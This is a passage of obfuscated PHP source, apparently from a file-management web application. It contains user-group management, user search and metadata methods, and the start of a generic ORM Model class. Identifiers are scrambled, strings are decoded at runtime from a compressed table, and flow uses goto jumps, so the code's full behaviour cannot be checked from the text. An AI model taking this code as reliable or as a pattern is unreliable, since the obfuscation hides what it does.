!1; } $ÑëôŸÉ = Model($é„Á“[1973]); $ÑëôŸÉ->where(array($é„Á“[1685] => $èüªûß))->delete(); $ˆ¸ö«¬ñ = array(); $Ôæšä½§ = 0; foreach ($ôê¤şªÊ as $«ƒÆöÕÊ => $èŠ‰ó¦) { $æÂ‚äíè = array($é„Á“[1685] => $èüªûß, $é„Á“[1883] => $«ƒÆöÕÊ, $é„Á“[1987] => $èŠ‰ó¦); $æÂ‚äíè[$é„Á“[1907]] = isset($İÌ©Ü²’[$Ôæšä½§]) ? $İÌ©Ü²’[$Ôæšä½§] : 0; $Ôæšä½§++; $ˆ¸ö«¬ñ[] = $æÂ‚äíè; } return $ÑëôŸÉ->addAll($ˆ¸ö«¬ñ, array(), !0); } protected function userGroupAdd($Š®ËïÅ¨, $üÛ–‹Õî = array()) { $ÅÙ²¬™ =& $_SERVER[ú÷îèÆÜ]; $ƒÍ£¬Áô = $this->getInfoSimple($Š®ËïÅ¨); if (!$ƒÍ£¬Áô || empty($üÛ–‹Õî)) { return !1; } $§½½ƒ•¿ = array(); foreach ($üÛ–‹Õî as $°Í¸™ì¦ => $„¹¯ƒôß) { $§½½ƒ•¿[] = array($ÅÙ²¬™[1685] => $Š®ËïÅ¨, $ÅÙ²¬™[1883] => $°Í¸™ì¦, $ÅÙ²¬™[1987] => $„¹¯ƒôß, $ÅÙ²¬™[1907] => 0); } return Model($ÅÙ²¬™[1973])->addAll($§½½ƒ•¿, array(), !0); } protected function userGroupRemove($¤‚‡Ø»Æ, $÷ş’ÍÛû) { $©»¬ÊÕµ =& $_SERVER[ú÷îèÆÜ]; $ƒáß»Â = $this->getInfoSimple($¤‚‡Ø»Æ); if (!$ƒáß»Â || !$÷ş’ÍÛû) { return !1; } $§±âºù÷ = array($©»¬ÊÕµ[1676] => $¤‚‡Ø»Æ, $©»¬ÊÕµ[1971] => $÷ş’ÍÛû); return Model($©»¬ÊÕµ[1973])->where($§±âºù÷)->delete(); } public function listData() { $óÙ˜ñòÃ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($óÙ˜ñòÃ[$_SERVER[ú÷îèÆÜ][422]]); return $óÙ˜ñòÃ; } public function listByID($íâÁüœ) { $ø•âú† =& $_SERVER[ú÷îèÆÜ]; if (!$íâÁüœ) { return; } $‡ÃâŸ³˜ = array($ø•âú†[1685] => array($ø•âú†[17], $íâÁüœ)); $„ÊŠ‹Ğ = $this->where($‡ÃâŸ³˜)->select(); $„ÊŠ‹Ğ = array_sort_keep($„ÊŠ‹Ğ, $ø•âú†[1685], $íâÁüœ); $this->_listDataApply($„ÊŠ‹Ğ); return $„ÊŠ‹Ğ; } public function listByGroup($á‹ùÁ¤ = 0, $íŸ¨¼ú¯ = array()) { $Ó“îÇÏÀ =& $_SERVER[ú÷îèÆÜ]; $åºğªó‰ = $Ó“îÇÏÀ[22]; $İ¤ıç²€ = array(); if ($á‹ùÁ¤) { $İ¤ıç²€ = array($Ó“îÇÏÀ[2371] => intval($á‹ùÁ¤)); $åºğªó‰ = "\x4c\x45\x46\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\x75\163\x65\x72\x5f\x67\x72\157\x75\x70\40\x75\163\x65\162\137\147\x72\157\x75\x70\x20\x6f\x6e\40\165\163\145\x72\56\165\x73\x65\162\111\x44\40\75\40\x75\x73\x65\x72\137\x67\x72\x6f\165\160\56\x75\163\145\x72\x49\x44"; $™Â³ôÏ„ = Input::get($Ó“îÇÏÀ[507], null, $Ó“îÇÏÀ[22]) ? $Ó“îÇÏÀ[22] : $Ó“îÇÏÀ[2372]; } if (isset($íŸ¨¼ú¯[$Ó“îÇÏÀ[790]])) { $İ¤ıç²€[$Ó“îÇÏÀ[2373]] = $íŸ¨¼ú¯[$Ó“îÇÏÀ[790]]; } $¸»–õ¶ = $this->_makeOrder($™Â³ôÏ„)->field($Ó“îÇÏÀ[2374])->where($İ¤ıç²€)->join($åºğªó‰)->selectPage(50); $this->_listDataApply($¸»–õ¶[$Ó“îÇÏÀ[422]]); return $¸»–õ¶; } private function _makeOrder($‚œ’Ò„ = '') { $¯¢øÕë¥ =& $_SERVER[ú÷îèÆÜ]; $¦¿±µåœ = array($¯¢øÕë¥[1685], $¯¢øÕë¥[42], $¯¢øÕë¥[1872], $¯¢øÕë¥[1844], $¯¢øÕë¥[225]); $¨¤ÀÖ = array($¯¢øÕë¥[500] => $¯¢øÕë¥[501], $¯¢øÕë¥[502] => $¯¢øÕë¥[503]); $Ç«ªËµ = Input::get($¯¢øÕë¥[507], $¯¢øÕë¥[17], $¯¢øÕë¥[1676], $¦¿±µåœ); $”é‡ìì­ = Input::get($¯¢øÕë¥[508], $¯¢øÕë¥[17], $¯¢øÕë¥[1974], array($¯¢øÕë¥[1974], $¯¢øÕë¥[502])); $”é‡ìì­ = $¨¤ÀÖ[$”é‡ìì­]; $‚œ’Ò„ = $‚œ’Ò„ . "\x75\163\x65\162\x2e{$Ç«ªËµ}\x20{$”é‡ìì­}\54\x20\165\x73\145\162\x2e\165\163\x65\x72\x49\104\40\x61\163\143"; return $this->alias($¯¢øÕë¥[2100])->order($‚œ’Ò„); } public function listSearch($ı©Ï…ºî) { $· €õ©Ø =& $_SERVER[ú÷îèÆÜ]; $ú„¤öÏ• = $ı©Ï…ºî[$· €õ©Ø[1977]]; $™ŞÂ = isset($ı©Ï…ºî[$· €õ©Ø[1978]]) ? $ı©Ï…ºî[$· €õ©Ø[1978]] : !1; $ú„¤öÏ• = str_replace($· €õ©Ø[1979], $· €õ©Ø[1980], trim($ú„¤öÏ•)); $İªŞÈøÃ = array($· €õ©Ø[42] => array($· €õ©Ø[436], "\45{$ú„¤öÏ•}\45"), $· €õ©Ø[358] => array($· €õ©Ø[436], "{$ú„¤öÏ•}\x25"), $· €õ©Ø[2165] => array($· €õ©Ø[436], "{$ú„¤öÏ•}\45"), $· €õ©Ø[1041] => $· €õ©Ø[1981]); if (Input::check($ú„¤öÏ•, $· €õ©Ø[364])) { $İªŞÈøÃ[$· €õ©Ø[1685]] = array($· €õ©Ø[436], "{$ú„¤öÏ•}\x25"); $İªŞÈøÃ[$· €õ©Ø[2356]] = array($· €õ©Ø[436], "{$ú„¤öÏ•}\x25"); } if (!$ú„¤öÏ•) { $İªŞÈøÃ = array(); } if (isset($ı©Ï…ºî[$· €õ©Ø[790]])) { $İªŞÈøÃ[$· €õ©Ø[790]] = $ı©Ï…ºî[$· €õ©Ø[790]]; } $İªŞÈøÃ = $this->parseWhereLike($İªŞÈøÃ); $—Ş´ìÙ’ = $this->_makeOrder()->where($İªŞÈøÃ)->selectPage(20); if (!$—Ş´ìÙ’ || count($—Ş´ìÙ’[$· €õ©Ø[422]]) < 5 && Input::check($ú„¤öÏ•, $· €õ©Ø[371])) { $³¸Åë‹ø = $this->_searchFromMeta($· €õ©Ø[514], $ú„¤öÏ•, 10); $º“€”Ç = $this->_searchFromMeta($· €õ©Ø[515], $ú„¤öÏ•, 10); $ø…Í®‡ = array_merge($³¸Åë‹ø, $º“€”Ç, $—Ş´ìÙ’[$· €õ©Ø[422]]); $—Ş´ìÙ’[$· €õ©Ø[422]] = array_unique_by_key($ø…Í®‡, $· €õ©Ø[1685]); $—Ş´ìÙ’[$· €õ©Ø[419]][$· €õ©Ø[420]] = count($—Ş´ìÙ’[$· €õ©Ø[422]]); $—Ş´ìÙ’[$· €õ©Ø[419]][$· €õ©Ø[421]] = ceil($—Ş´ìÙ’[$· €õ©Ø[419]][$· €õ©Ø[420]] / $—Ş´ìÙ’[$· €õ©Ø[419]][$· €õ©Ø[416]]); } $this->_listDataApply($—Ş´ìÙ’[$· €õ©Ø[422]]); $this->_filterByGroup($—Ş´ìÙ’, $™ŞÂ); return $—Ş´ìÙ’; } private function _filterByGroup(&$ø±â‰, $¼èìÔñ¢) { $¤º©Ğš =& $_SERVER[ú÷îèÆÜ]; if (!$¼èìÔñ¢) { return $ø±â‰; } foreach ($ø±â‰[$¤º©Ğš[422]] as $¼ŸğìÈÍ => &$¯³ÓĞ©µ) { $·æ¼Ø¼‰ = array_to_keyvalue($¯³ÓĞ©µ[$¤º©Ğš[2070]], $¤º©Ğš[22], $¤º©Ğš[1883]); if (!in_array($¼èìÔñ¢, $·æ¼Ø¼‰)) { unset($ø±â‰[$¤º©Ğš[422]][$¼ŸğìÈÍ]); } } unset($¯³ÓĞ©µ); $ø±â‰[$¤º©Ğš[422]] = array_values($ø±â‰[$¤º©Ğš[422]]); $ø±â‰[$¤º©Ğš[419]] = array($¤º©Ğš[2135] => count($ø±â‰[$¤º©Ğš[422]]), $¤º©Ğš[2133] => $ø±â‰[$¤º©Ğš[419]][$¤º©Ğš[416]], $¤º©Ğš[2132] => 1, $¤º©Ğš[2134] => 1); } private function _searchFromMeta($¯¤™ù¦æ, $Ä°Ô¿¾, $‡£ñÇ…€) { $³ÙëŞ¸¢ =& $_SERVER[ú÷îèÆÜ]; $Ä°Ô¿¾ = strtolower($Ä°Ô¿¾); $¥¦¾ïù = array($³ÙëŞ¸¢[104] => $¯¤™ù¦æ, $³ÙëŞ¸¢[427] => array($³ÙëŞ¸¢[436], "\45{$Ä°Ô¿¾}\45")); $¥¦¾ïù = $this->parseWhereLike($¥¦¾ïù); $ô¬¤Ì‚æ = Model($³ÙëŞ¸¢[2375])->where($¥¦¾ïù)->limit($‡£ñÇ…€)->select(); if (!$ô¬¤Ì‚æ) { return array(); } $ô¬¤Ì‚æ = array_to_keyvalue($ô¬¤Ì‚æ, $³ÙëŞ¸¢[22], $³ÙëŞ¸¢[1685]); $ªĞÅ°ëü = $this->where(array($³ÙëŞ¸¢[1676] => array($³ÙëŞ¸¢[17], $ô¬¤Ì‚æ)))->select(); if (!$ªĞÅ°ëü) { return array(); } return $ªĞÅ°ëü; } private function _listDataApplyItem($¶şÉšÍÇ) { $ö½Èé£¥ = array($¶şÉšÍÇ); $this->_listDataApply($ö½Èé£¥); return $ö½Èé£¥[0]; } private function _listDataApply(&$ Œñş£) { $Ê†µ¡°– =& $_SERVER[ú÷îèÆÜ]; if (!$ Œñş£) { return; } array_remove_key($ Œñş£, $Ê†µ¡°–[930]); $ôï‘”Û = array_to_keyvalue($ Œñş£, $Ê†µ¡°–[22], $Ê†µ¡°–[1685]); $this->_listAppendGroup($ Œñş£, $ôï‘”Û); $this->_listAppendMeta($ Œñş£, $ôï‘”Û); $this->_listAppendSourceRoot($ Œñş£, $ôï‘”Û); } private function _listAppendSourceRoot(&$ò¶‚ü‡, $÷¿à¦Õ) { $»¨•¥ =& $_SERVER[ú÷îèÆÜ]; $éÉå­Õ³ = Model($»¨•¥[865])->listSourceRoot(SourceModel::TYPE_USER, $÷¿à¦Õ); $éÉå­Õ³ = array_to_keyvalue($éÉå­Õ³, $»¨•¥[547]); $éÉå­Õ³ = array_remove_key($éÉå­Õ³, $»¨•¥[547]); foreach ($ò¶‚ü‡ as &$ûÌÌ·Ò) { $ûÌÌ·Ò[$»¨•¥[97]] = $éÉå­Õ³[$ûÌÌ·Ò[$»¨•¥[1685]]] ? $éÉå­Õ³[$ûÌÌ·Ò[$»¨•¥[1685]]] : array(); } unset($ûÌÌ·Ò); } private function _listAppendGroup(&$ùÌ½Ì—™, $Ó¦¼•ê€) { $ôö´î˜€ =& $_SERVER[ú÷îèÆÜ]; $îé¨ì¹‰ = array($ôö´î˜€[1685] => array($ôö´î˜€[17], $Ó¦¼•ê€)); $µÃ¤¾Ê¢ = Model($ôö´î˜€[1973])->where($îé¨ì¹‰)->select(); $öÅî ¾í = array_to_keyvalue($µÃ¤¾Ê¢, $ôö´î˜€[22], $ôö´î˜€[1883]); $öÅî ¾í = array_remove_value(array_unique($öÅî ¾í), $ôö´î˜€[222]); if (!$öÅî ¾í || !$µÃ¤¾Ê¢) { return; } $îé¨ì¹‰ = array($ôö´î˜€[1883] => array($ôö´î˜€[17], $öÅî ¾í)); $ÍÆÉœÏÎ = Model($ôö´î˜€[2068])->field($ôö´î˜€[2376])->where($îé¨ì¹‰)->select(); $ÍÆÉœÏÎ = array_to_keyvalue($ÍÆÉœÏÎ, $ôö´î˜€[1883]); $µÃ¤¾Ê¢ = array_to_keyvalue_group($µÃ¤¾Ê¢, $ôö´î˜€[1685]); foreach ($µÃ¤¾Ê¢ as &$©¶ºäôÏ) { $úãåØ¡ = array(); foreach ($©¶ºäôÏ as $é—¾üàŒ) { if (!$é—¾üàŒ[$ôö´î˜€[1987]]) { continue; } $ĞËØÈö¢ = Model($ôö´î˜€[549])->listData($é—¾üàŒ[$ôö´î˜€[1987]]); $úãåØ¡[] = array($ôö´î˜€[1883] => $é—¾üàŒ[$ôö´î˜€[1883]], $ôö´î˜€[2377] => $ÍÆÉœÏÎ[$é—¾üàŒ[$ôö´î˜€[1883]]][$ôö´î˜€[42]], $ôö´î˜€[562] => $ÍÆÉœÏÎ[$é—¾üàŒ[$ôö´î˜€[1883]]][$ôö´î˜€[562]], $ôö´î˜€[464] => $ĞËØÈö¢); } $©¶ºäôÏ = $úãåØ¡; } unset($©¶ºäôÏ); foreach ($ùÌ½Ì—™ as &$Šƒ§ÔŸ•) { $Šƒ§ÔŸ•[$ôö´î˜€[2070]] = array(); if (isset($µÃ¤¾Ê¢[$Šƒ§ÔŸ•[$ôö´î˜€[1685]]])) { $Šƒ§ÔŸ•[$ôö´î˜€[2070]] = $µÃ¤¾Ê¢[$Šƒ§ÔŸ•[$ôö´î˜€[1685]]]; } } unset($Šƒ§ÔŸ•); } public function userAppendGroup($Ò¡Ø‘›) { $ôÑÆôØ =& $_SERVER[ú÷îèÆÜ]; if (!$Ò¡Ø‘›) { return array(); } $this->_listAppendGroup($Ò¡Ø‘›, array_to_keyvalue($Ò¡Ø‘›, $ôÑÆôØ[22], $ôÑÆôØ[1685])); return $Ò¡Ø‘›; } private function _listAppendMeta(&$Èï—µ¹, $şğ…©åÈ) { $ø¸Ş¼Ø =& $_SERVER[ú÷îèÆÜ]; $Éö™Óƒø = UserJobModel::JOB_KEY; $±¾Ôñı¨ = array($ø¸Ş¼Ø[2357]); $Ö¼à™· = array($ø¸Ş¼Ø[1685] => array($ø¸Ş¼Ø[17], $şğ…©åÈ)); $”›¾Ú©Ü = Model($ø¸Ş¼Ø[2355])->where($Ö¼à™·)->select(); $”›¾Ú©Ü = array_to_keyvalue_group($”›¾Ú©Ü, $ø¸Ş¼Ø[1685]); foreach ($”›¾Ú©Ü as &$º×üÉ±) { $éÍ‹Ùè‚ = array(); foreach ($º×üÉ± as $“ª»Ğ„) { if (!in_array($“ª»Ğ„[$ø¸Ş¼Ø[104]], $±¾Ôñı¨)) { $éÍ‹Ùè‚[$“ª»Ğ„[$ø¸Ş¼Ø[104]]] = $“ª»Ğ„[$ø¸Ş¼Ø[427]]; } } $º×üÉ± = $éÍ‹Ùè‚; } unset($º×üÉ±); $ÎŠÌÎ‡ = Model($ø¸Ş¼Ø[2378]); foreach ($Èï—µ¹ as &$ƒÓû˜å) { $şÑÑâç = array(); if (isset($”›¾Ú©Ü[$ƒÓû˜å[$ø¸Ş¼Ø[1685]]])) { $şÑÑâç = $”›¾Ú©Ü[$ƒÓû˜å[$ø¸Ş¼Ø[1685]]]; } $ƒÓû˜å[$ø¸Ş¼Ø[2379]] = array(); if (isset($şÑÑâç[$Éö™Óƒø])) { $ƒÓû˜å[$ø¸Ş¼Ø[2379]] = $ÎŠÌÎ‡->getUserJobInfo($şÑÑâç[$Éö™Óƒø]); } } unset($ƒÓû˜å); } protected function groupUserAll($ï¾ÉÂ¢î) { $‚å¹Íé =& $_SERVER[ú÷îèÆÜ]; if (!$ï¾ÉÂ¢î) { return !1; } $Ó­ˆõ×² = Model($‚å¹Íé[1973])->field($‚å¹Íé[1685])->where(array($‚å¹Íé[1883] => array($‚å¹Íé[17], $ï¾ÉÂ¢î)))->select(); $Ó­ˆõ×² = array_to_keyvalue($Ó­ˆõ×², $‚å¹Íé[22], $‚å¹Íé[1685]); return array_unique($Ó­ˆõ×²); } public function userSearch($†£…ç, $êÏ¤í¨Œ = "\52") { return Model($_SERVER[ú÷îèÆÜ][576])->where($†£…ç)->field($êÏ¤í¨Œ)->find(); } } goto eÍìÖäÑŠ»; cï×Œ †˜²: define($_SERVER[ú÷îèÆÜ][0], $_SERVER[ú÷îèÆÜ][1]); $_SERVER[¶–®Â†­] = explode($_SERVER[ú÷îèÆÜ][2], gzinflate(substr($_SERVER[ú÷îèÆÜ][3], 10, -8))); function binCheckEq($ˆÊŸ¶îé, $ó€‹òº) { return $ˆÊŸ¶îé == $ó€‹òº; } goto C¿¬„·ğç–; Bš ±«ÃØ­: define($_SERVER[ú÷îèÆÜ][296], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\154\x65", "\x6f\162\x64\x65\162", "\141\x6c\151\141\163", "\x68\x61\166\x69\x6e\x67", "\x67\x72\x6f\x75\x70", "\154\x6f\x63\153", "\x64\151\163\x74\151\x6e\143\x74", "\141\165\164\157", "\146\151\x6c\164\145\x72", "\166\141\154\151\x64\x61\x74\x65", "\162\145\163\165\x6c\x74", "\x62\151\x6e\144", "\x74\157\x6b\145\x6e"); public function __construct($Ü–…æœø = '', $¯š˜îß = '', $©¿§“Ä… = '') { $¦†‰à =& $_SERVER[ú÷îèÆÜ]; $this->_initialize(); if (!empty($Ü–…æœø)) { if (strpos($Ü–…æœø, $¦†‰à[20])) { list($this->dbName, $this->name) = explode($¦†‰à[20], $Ü–…æœø); } else { $this->name = $Ü–…æœø; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¯š˜îß)) { $this->tablePrefix = $¦†‰à[22]; } elseif ($¦†‰à[22] != $¯š˜îß) { $this->tablePrefix = $¯š˜îß; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¦†‰à[297]); } $this->db(0, empty($this->connection) ? $©¿§“Ä… : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $û»§ÄŠç =& $_SERVER[ú÷îèÆÜ]; if (empty($this->fields)) { if (think_config($û»§ÄŠç[298])) { $™à²¤©Ÿ = $this->dbName ? $this->dbName : think_config($û»§ÄŠç[299]); $–ôéŸÁ“ = think_var_cache($û»§ÄŠç[300] . strtolower(get_path_this($™à²¤©Ÿ) . $û»§ÄŠç[20] . $this->name)); if ($–ôéŸÁ“) { $Œ‘îÜÑ© = think_config($û»§ÄŠç[301]); if (empty($Œ‘îÜÑ©) || $–ôéŸÁ“[$û»§ÄŠç[302]] == $Œ‘îÜÑ©) { $this->fields = $–ôéŸÁ“; return; } } } $this->flush(); } } public function flush() { $‡éµŒ½ò =& $_SERVER[ú÷îèÆÜ]; $this->db->setModel($this->name); $ìÀ¸ø£ª = $this->db->getFields($this->getTableName()); if (!$ìÀ¸ø£ª) { return !1; } $this->fields = array_keys($ìÀ¸ø£ª); $this->fields[$‡éµŒ½ò[303]] = !1; foreach ($ìÀ¸ø£ª as $’Ş„·µÒ => $Ûá¨şäé) { $ùšÕ§¤[$’Ş„·µÒ] = $Ûá¨şäé[$‡éµŒ½ò[43]]; if ($Ûá¨şäé[$‡éµŒ½ò[49]]) { $this->fields[$‡éµŒ½ò[304]] = $’Ş„·µÒ; if ($Ûá¨şäé[$‡éµŒ½ò[52]]) { $this->fields[$‡éµŒ½ò[303]] = !0; } } } $this->fields[$‡éµŒ½ò[305]] = $ùšÕ§¤; if (think_config($‡éµŒ½ò[301])) { $this->fields[$‡éµŒ½ò[302]] = think_config($‡éµŒ½ò[301]); } if (think_config($‡éµŒ½ò[298])) { $øí­¸†‡ = $this->dbName ? $this->dbName : think_config($‡éµŒ½ò[299]); think_var_cache($‡éµŒ½ò[300] . strtolower(get_path_this($øí­¸†‡) . $‡éµŒ½ò[20] . $this->name), $this->fields); } } public function switchModel($ºì’¢õ, $øÄß“îê = array()) { $®éˆ»Òİ =& $_SERVER[ú÷îèÆÜ]; $‚šÄ£¸É = ucwords(strtolower($ºì’¢õ)) . $®éˆ»Òİ[306]; if (!class_exists($‚šÄ£¸É)) { think_exception($‚šÄ£¸É . think_lang($®éˆ»Òİ[307])); } $this->_extModel = new $‚šÄ£¸É($this->name); if (!empty($øÄß“îê)) { foreach ($øÄß“îê as $êÜû²”Í) { $this->_extModel->setProperty($êÜû²”Í, $this->{$êÜû²”Í}); } } return $this->_extModel; } public function __set($ôÕúúË», $ÒÄ¡†§) { $this->data[$ôÕúúË»] = $ÒÄ¡†§; } public function __get($Î¢¿­ı) { return isset($this->data[$Î¢¿­ı]) ? $this->data[$Î¢¿­ı] : null; } public function __isset($é¡çş) { return isset($this->data[$é¡çş]); } public function __unset($éüŸ›Ÿ) { unset($this->data[$éüŸ›Ÿ]); } public function __call($°ô…€èä, $Î»®ÏÏú) { $„ç”õéÕ =& $_SERVER[ú÷îèÆÜ]; if (in_array(strtolower($°ô…€èä), $this->methods, !0)) { $this->options[strtolower($°ô…€èä)] = $Î»®ÏÏú[0]; return $this; } elseif (in_array(strtolower($°ô…€èä), array($„ç”õéÕ[308], $„ç”õéÕ[309], $„ç”õéÕ[310], $„ç”õéÕ[311], $„ç”õéÕ[312]), !0)) { $‘¹‹ÌüÖ = isset($Î»®ÏÏú[0]) ? $Î»®ÏÏú[0] : $„ç”õéÕ[213]; $‘¹‹ÌüÖ = $this->db->parseKey($‘¹‹ÌüÖ); return $this->getField(strtoupper($°ô…€èä) . $„ç”õéÕ[313] . $‘¹‹ÌüÖ . $„ç”õéÕ[314] . $°ô…€èä, $„ç”õéÕ[308]); } elseif (strtolower(substr($°ô…€èä, 0, 5)) == $„ç”õéÕ[315]) { $‘¹‹ÌüÖ = think_parse_name(substr($°ô…€èä, 5)); $³Óœ¸šØ[$‘¹‹ÌüÖ] = $Î»®ÏÏú[0]; return $this->where($³Óœ¸šØ)->find(); } elseif (strtolower(substr($°ô…€èä, 0, 10)) == $„ç”õéÕ[316]) { $ûãºé·Æ = think_parse_name(substr($°ô…€èä, 10)); $³Óœ¸šØ[$ûãºé·Æ] = $Î»®ÏÏú[0]; return $this->where($³Óœ¸šØ)->getField($Î»®ÏÏú[1]); } elseif (isset($this->_scope[$°ô…€èä])) { return $this->scope($°ô…€èä, $Î»®ÏÏú[0]); } elseif (method_exists($this, $°ô…€èä)) { array_unshift($Î»®ÏÏú, $°ô…€èä); return call_user_func_array(array($this, $„ç”õéÕ[317]), $Î»®ÏÏú); } else { return call_user_func_array(array(parent, $°ô…€èä), $Î»®ÏÏú); } } protected function call() { $¨‚×¹Ó˜ =& $_SERVER[ú÷îèÆÜ]; $áš˜«¸¾ = func_get_args(); $ŠíØœÀù = array_shift($áš˜«¸¾); $¹–™ˆíœ = $ŠíØœÀù; if (is_array($ŠíØœÀù)) { $¹–™ˆíœ = $ŠíØœÀù[1]; $ŠíØœÀù = $ŠíØœÀù[0]; } $Í”‘²©¬ = count($áš˜«¸¾) - 1; if (isset($áš˜«¸¾[$Í”‘²©¬]) && $áš˜«¸¾[$Í”‘²©¬] === $ŠíØœÀù) { think_exception(__CLASS__ . $¨‚×¹Ó˜[4] . $ŠíØœÀù . think_lang($¨‚×¹Ó˜[318])); return; } $áš˜«¸¾[] = $ŠíØœÀù; if (method_exists($this, $¨‚×¹Ó˜[319])) { $ÁÌàÏø = call_user_func_array(array($this, $¨‚×¹Ó˜[320]), array($¹–™ˆíœ, $áš˜«¸¾)); if (!is_null($ÁÌàÏø) && $ÁÌàÏø !== !1) { return $ÁÌàÏø; } } $µ¡”ñè‘ = call_user_func_array(array($this, $ŠíØœÀù), $áš˜«¸¾); if (method_exists($this, $¨‚×¹Ó˜[321])) { $ÁÌàÏø = call_user_func_array(array($this, $¨‚×¹Ó˜[322]), array($¹–™ˆíœ, $áš˜«¸¾, $µ¡”ñè‘)); if ($ÁÌàÏø) { return $ÁÌàÏø; } } return $µ¡”ñè‘; } protected function _initialize() { } protected function _facade($İÔôÌ†©) { $Ôáğï¬× =& $_SERVER[ú÷îèÆÜ]; if (!empty($this->fields)) { foreach ($İÔôÌ†© as $×ÄÚäÔ  => $øÎ’Ö±Ú) { if (is_array($this->fields) && !in_array($×ÄÚäÔ , $this->fields, !0)) { unset($İÔôÌ†©[$×ÄÚäÔ ]); } elseif (is_scalar($øÎ’Ö±Ú)) { $this->_parseType($İÔôÌ†©, $×ÄÚäÔ ); } } } if (!empty($this->options[$Ôáğï¬×[323]])) { $İÔôÌ†© = array_map($this->options[$Ôáğï¬×[323]], $İÔôÌ†©); unset($this->options[$Ôáğï¬×[323]]); } $this->_beforeWrite($İÔôÌ†©); return $İÔôÌ†©; } protected function _beforeWrite(&$ìúßÑ¢º) { } public function add($ŠÏûÖ õ = '', $¶Ú„àÅê = array(), $¡ÂÈ»‘’ = false) { if (empty($ŠÏûÖ õ)) { if (!empty($this->data)) { $ŠÏûÖ õ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ú÷îèÆÜ][324]); return !1; } } $¶Ú„àÅê = $this->_parseOptions($¶Ú„àÅê); $ŠÏûÖ õ = $this->_facade($ŠÏûÖ õ); if (!1 === $this->_beforeInsert($ŠÏûÖ õ, $¶Ú„àÅê)) { return !1; } $À±­—¶ó = $this->db->insert($ŠÏûÖ õ, $¶Ú„àÅê, $¡ÂÈ»‘’); if (!1 !== $À±­—¶ó) { $Ù€ìç‘Á = $this->getLastInsID(); if ($Ù€ìç‘Á) { $ŠÏûÖ õ[$this->getPk()] = $Ù€ìç‘Á; $this->_after_insert($ŠÏûÖ õ, $¶Ú„àÅê); return $Ù€ìç‘Á; } $this->_after_insert($ŠÏûÖ õ, $¶Ú„àÅê); } return $À±­—¶ó; } protected function _beforeInsert(&$ùÚ¢‹Í, $³ÑÂºçá) { } protected function _after_insert($ñé£…¼Ü, $™ËõÉŒ×) { } public function addAll($¸½ô•–ê, $øá •Æ = array(), $°Êû¨°À = false) { $³’Êß—Ù =& $_SERVER[ú÷îèÆÜ]; if (empty($¸½ô•–ê)) { $this->error = think_lang($³’Êß—Ù[324]); return !1; } $øá •Æ = $this->_parseOptions($øá •Æ); foreach ($¸½ô•–ê as $åÔ¿Éá¼ => $Ç‰óî®©) { $¸½ô•–ê[$åÔ¿Éá¼] = $this->_facade($Ç‰óî®©); } if (method_exists($this->db, $³’Êß—Ù[325])) { $‹ÈâÌì‹ = $this->db->insertAll($¸½ô•–ê, $øá •Æ, $°Êû¨°À); } else { $this->startTrans(); foreach ($¸½ô•–ê as $åÔ¿Éá¼ => $Ç‰óî®©) { $‹ÈâÌì‹ = $this->db->insert($Ç‰óî®©, $øá •Æ, $°Êû¨°À); } $this->commit(); } if (!1 !== $‹ÈâÌì‹) { $¶ ÕßÌ² = $this->getLastInsID(); if ($¶ ÕßÌ²) { return $¶ ÕßÌ²; } } return $‹ÈâÌì‹; } public function selectAdd($ìıß‹¬ = '', $¼‚Òñ°× = '', $®Ô×îãÏ = array()) { $ûŠÁ¢ Ö =& $_SERVER[ú÷îèÆÜ]; $®Ô×îãÏ = $this->_parseOptions($®Ô×îãÏ); if (!1 === ($üÖ×ËÈĞ = $this->db->selectInsert($ìıß‹¬ ? $ìıß‹¬ : $®Ô×îãÏ[$ûŠÁ¢ Ö[326]], $¼‚Òñ°× ? $¼‚Òñ°× : $this->getTableName(), $®Ô×îãÏ))) { $this->error = think_lang($ûŠÁ¢ Ö[327]); return !1; } else { return $üÖ×ËÈĞ; } } public function save($†¸îÂ¶è = '', $¬Êôè½ = array()) { $‡½…Üà =& $_SERVER[ú÷îèÆÜ]; if (empty($†¸îÂ¶è)) { if (!empty($this->data)) { $†¸îÂ¶è = $this->data; $this->data = array(); } else { $this->error = think_lang($‡½…Üà[324]); return !1; } } $†¸îÂ¶è = $this->_facade($†¸îÂ¶è); $¬Êôè½ = $this->_parseOptions($¬Êôè½); $³îÚËƒ = $this->getPk(); if (!isset($¬Êôè½[$‡½…Üà[328]])) { if (isset($†¸îÂ¶è[$³îÚËƒ])) { $şÓÄ¤µË[$³îÚËƒ] = $†¸îÂ¶è[$³îÚËƒ]; $¬Êôè½[$‡½…Üà[328]] = $şÓÄ¤µË; unset($†¸îÂ¶è[$³îÚËƒ]); } else { $this->error = think_lang($‡½…Üà[327]); return !1; } } if (is_array($¬Êôè½[$‡½…Üà[328]]) && isset($¬Êôè½[$‡½…Üà[328]][$³îÚËƒ])) { $á¤€‰£¢ = $¬Êôè½[$‡½…Üà[328]][$³îÚËƒ]; } if (!1 === $this->_beforeUpdate($†¸îÂ¶è, $¬Êôè½)) { return !1; } $—‰«½ü÷ = $this->db->update($†¸îÂ¶è, $¬Êôè½); if (!1 !== $—‰«½ü÷) { if (isset($á¤€‰£¢)) { $†¸îÂ¶è[$³îÚËƒ] = $á¤€‰£¢; } $this->_afterUpdate($†¸îÂ¶è, $¬Êôè½); } return $—‰«½ü÷; } protected function _beforeUpdate(&$´Ö¿Ñîå, $‹†àêÇ) { } protected function _afterUpdate($öä¾ì“â, $Œ²‡†) { } public function delete($ •²•ÑŠ = array()) { $˜Úˆ¯ß =& $_SERVER[ú÷îèÆÜ]; if (empty($ •²•ÑŠ) && empty($this->options[$˜Úˆ¯ß[328]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $˜Ş¿…¾û = $this->getPk(); if (is_numeric($ •²•ÑŠ) || is_string($ •²•ÑŠ)) { if (strpos($ •²•ÑŠ, 